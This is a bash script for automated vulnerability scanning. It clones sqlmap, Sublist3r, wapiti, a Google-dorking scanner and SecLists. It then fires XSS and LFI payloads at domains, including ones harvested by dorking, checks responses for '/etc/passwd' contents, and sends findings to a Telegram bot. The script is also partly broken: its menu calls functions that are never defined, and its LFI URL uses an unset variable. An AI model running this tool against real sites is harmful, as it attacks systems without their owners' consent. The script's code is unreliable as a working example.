#!/bin/bash

# Directory to store tools, outputs, and new payloads
TOOLS_DIR="$HOME/security-tools"
OUTPUT_DIR="$TOOLS_DIR/output"
PAYLOADS_DIR="$TOOLS_DIR/payloads"
SECLISTS_DIR="$TOOLS_DIR/seclists"
mkdir -p $TOOLS_DIR
mkdir -p $OUTPUT_DIR
mkdir -p $PAYLOADS_DIR
mkdir -p $SECLISTS_DIR

# Telegram Bot Token and Chat ID (replace these)
BOT_TOKEN="YOUR_TELEGRAM_BOT_TOKEN"
CHAT_ID="YOUR_TELEGRAM_CHAT_ID"

# Function to send Telegram notifications
send_telegram_message() {
    local message=$1
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d chat_id="$CHAT_ID" \
        -d text="$message" > /dev/null
}

# Clone required GitHub repositories automatically
clone_tools() {
    echo "[+] Cloning all necessary tools from GitHub..."
    send_telegram_message "[+] Starting to clone all necessary tools..."

    if [[ ! -d "$TOOLS_DIR/Sublist3r" ]]; then
        git clone https://github.com/aboul3la/Sublist3r.git $TOOLS_DIR/Sublist3r
    fi

    if [[ ! -d "$TOOLS_DIR/sqlmap" ]]; then
        git clone https://github.com/sqlmapproject/sqlmap.git $TOOLS_DIR/sqlmap
    fi

    if [[ ! -d "$TOOLS_DIR/wapiti" ]]; then
        git clone https://github.com/ifrostman/wapiti.git $TOOLS_DIR/wapiti
    fi

    if [[ ! -d "$TOOLS_DIR/BigBountyRecon" ]]; then
        git clone https://github.com/Viralmaniar/BigBountyRecon.git $TOOLS_DIR/BigBountyRecon
    fi

    if [[ ! -d "$TOOLS_DIR/dorking_tool" ]]; then
        git clone https://github.com/googleinurl/SCANNER-INURLBR.git $TOOLS_DIR/dorking_tool
    fi

    if [[ ! -d "$SECLISTS_DIR" ]]; then
        git clone https://github.com/danielmiessler/SecLists.git $SECLISTS_DIR
    fi

    send_telegram_message "[+] All necessary tools cloned successfully."
}

# Function to scrape the latest XSS payloads from PortSwigger
scrape_xss_payloads() {
    echo "[+] Scraping the latest XSS payloads from PortSwigger..."
    send_telegram_message "[+] Scraping the latest XSS payloads from PortSwigger..."

    curl -s "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onanimationstart" | \
    grep -oP '(?<=<code>).*?(?=</code>)' > "$PAYLOADS_DIR/latest_xss_payloads.txt"

    echo "[+] Latest XSS payloads scraped and saved to $PAYLOADS_DIR/latest_xss_payloads.txt."
    send_telegram_message "[+] Latest XSS payloads scraped successfully."
}

# Sanitize domain input to remove protocols
sanitize_domain() {
    domain=$(echo "$1" | sed -e 's/^https\?:\/\///' -e 's/\/$//')
    echo "$domain"
}

# Ensure all required tools are installed
check_tool_dependencies() {
    clone_tools  # Ensure all tools are cloned before checking dependencies

    if ! command -v python3 &> /dev/null; then
        send_telegram_message "Python3 is required for some tools. Please install Python3."
        echo "Python3 is required for this script. Please install Python3."
        exit 1
    fi

    if ! command -v java &> /dev/null; then
        send_telegram_message "Java is required for some tools. Please install Java."
        echo "Java is required for DirBuster. Please install Java."
        exit 1
    fi
}

# Function to display a banner
print_banner() {
    echo -e "\e[1;31m#############################################################"
    echo -e "#       Ultimate Security Dorker and Vulnerability Scanner       #"
    echo -e "#############################################################\e[0m"
}

# Function to create a domain list
create_domain_list() {
    echo "Enter the filename to save the domain list (e.g., domains.txt):"
    read domain_list_file
    touch $domain_list_file
    echo "Enter domains (one per line). Press Ctrl+D when done."
    cat >> $domain_list_file
    echo "Domain list created: $domain_list_file"
}

# Function to run Google Dorking and optionally add domains to the list
run_google_dorking() {
    echo "Running Google Dorking using dorking tool..."
    python3 $TOOLS_DIR/dorking_tool/dorker.py > "$OUTPUT_DIR/dorking_results.txt"
    send_telegram_message "Google Dorking completed. Results saved in dorking_results.txt."

    echo "Do you want to add the discovered domains to a domain list? (y/n)"
    read add_domains
    if [[ $add_domains == "y" || $add_domains == "Y" ]]; then
        echo "Enter the filename to save the domains (e.g., domains.txt):"
        read domain_list_file
        grep -oP 'https?://\K[^/]*' "$OUTPUT_DIR/dorking_results.txt" >> $domain_list_file
        echo "Domains have been added to $domain_list_file."
    fi
}

# Function to run Sublist3r for subdomain enumeration
run_sublist3r() {
    local domain=$1
    sanitized_domain=$(sanitize_domain "$domain")
    echo "[+] Running Sublist3r on $domain..." | tee -a "$OUTPUT_DIR/sublist3r_$sanitized_domain.log"
    python3 $TOOLS_DIR/Sublist3r/sublist3r.py -d $sanitized_domain -o $OUTPUT_DIR/subdomains_$sanitized_domain.txt >> "$OUTPUT_DIR/sublist3r_$sanitized_domain.log" 2>&1
    send_telegram_message "Sublist3r scan completed for $sanitized_domain."
}

# Run XSS testing using scraped payloads from PortSwigger and SecLists
run_xss() {
    local domain=$1
    sanitized_domain=$(sanitize_domain "$domain")
    payloads=$(cat $PAYLOADS_DIR/latest_xss_payloads.txt $SECLISTS_DIR/Fuzzing/XSS/xss-payload-list.txt)
    echo "[+] Running XSS scan on $sanitized_domain..."
    for payload in $payloads; do
        url="http://$sanitized_domain?q=$payload"
        response=$(curl -s "$url")
        if [[ "$response" == *"$payload"* ]]; then
            send_telegram_message "XSS vulnerability found on $sanitized_domain with payload: $payload"
        fi
    done
}

# Run SQLMap for SQL Injection check
run_sqlmap() {
    local domain=$1
    sanitized_domain=$(sanitize_domain "$domain")
    echo "[+] Running SQLMap on $domain..." | tee -a "$OUTPUT_DIR/sqlmap_$sanitized_domain.log"
    python3 $TOOLS_DIR/sqlmap/sqlmap.py -u "http://$sanitized_domain" --batch --output-dir=$OUTPUT_DIR/sqlmap_$sanitized_domain >> "$OUTPUT_DIR/sqlmap_$sanitized_domain.log" 2>&1
    send_telegram_message "SQLMap scan completed for $sanitized_domain."
}

# Clickjacking Check
run_clickjacking() {
    local domain=$1
    sanitized_domain=$(sanitize_domain "$domain")
    headers=$(curl -s -I "$sanitized_domain" | grep -i "x-frame-options")
    if [[ -z "$headers" ]]; then
        send_telegram_message "Clickjacking vulnerability found on $sanitized_domain!"
    else
        send_telegram_message "No Clickjacking vulnerability found on $sanitized_domain."
    fi
}

# Run Wapiti for web vulnerability scanning
run_wapiti() {
    local domain=$1
    sanitized_domain=$(sanitize_domain "$domain")
    echo "[+] Running Wapiti on $sanitized_domain..."
    wapiti -u "http://$sanitized_domain" -o "$OUTPUT_DIR/wapiti_$sanitized_domain.txt" > "$OUTPUT_DIR/wapiti_$sanitized_domain.log" 2>&1
    send_telegram_message "Wapiti scan completed for $sanitized_domain."
}

# Run RFI/LFI testing using payloads from SecLists
run_rfi_lfi() {
    local domain=$1
    sanitized_domain=$(sanitize_domain "$domain")
    payloads=$(cat $SECLISTS_DIR/Fuzzing/LFI/LFI-payload.txt)
    echo "[+] Running RFI/LFI scan on $sanitized_domain..."
    for payload in $payloads; do
        url="http://$sanitized_domain$file=$payload"
        response=$(curl -s "$url")
        if [[ "$response" == *"root:x:0:0"* ]]; then
            send_telegram_message "RFI/LFI vulnerability found on $sanitized_domain with payload: $payload"
        fi
    done
}

# Main loop and options
main_menu() {
    while true; do
        check_tool_dependencies  # Ensure tools are set up before proceeding
        print_banner

        echo -e "\e[1;34m###############################################"
        echo -e "# 1. Create a new domain list                  #"
        echo -e "# 2. Run Google Dorking and manage domains     #"
        echo -e "# 3. Run all tools automatically               #"
        echo -e "# 4. Run each tool one by one                  #"
        echo -e "# 5. Quit                                      #"
        echo -e "###############################################\e[0m"
        echo "Please choose an option:"
        read option

        case $option in
            1) create_domain_list ;;
            2) run_google_dorking ;;
            3) run_all_tools ;;
            4) run_tools_one_by_one ;;
            5) exit 0 ;;
            *) echo -e "\e[1;31mInvalid option. Please try again.\e[0m" ;;
        esac
    done
}

# Run the script
main_menu
